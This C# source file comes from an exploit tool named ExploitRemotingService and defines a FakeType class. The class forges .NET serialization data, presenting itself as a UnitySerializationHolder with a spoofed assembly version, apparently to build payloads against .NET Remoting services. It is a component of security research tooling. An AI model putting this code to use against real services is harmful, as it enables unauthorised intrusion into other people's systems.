﻿//    ExploitRemotingService
//    Copyright (C) 2014 James Forshaw
//
//    This program is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or
//    (at your option) any later version.
//
//    This program is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with this program.  If not, see <http://www.gnu.org/licenses/>.

using System;
using System.Reflection;
using System.Runtime.Serialization;

namespace ExploitRemotingService
{
    [Serializable]
    class FakeType : TypeDelegator, ISerializable
    {
        Type _t;
        int _version;

        public FakeType(Type t, int version) : base(t)
        {
            _t = t;
            _version = version;
        }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            ISerializable s = (ISerializable)_t;

            info.AddValue("UnityType", 4);
            info.AddValue("Data", _t.FullName);

            AssemblyName name = _t.Assembly.GetName();
            name.Version = new Version(_version, 0, 0, 0);
            info.AddValue("AssemblyName", name.ToString());

            info.SetType(Type.GetType("System.UnitySerializationHolder"));
        }
    }
}
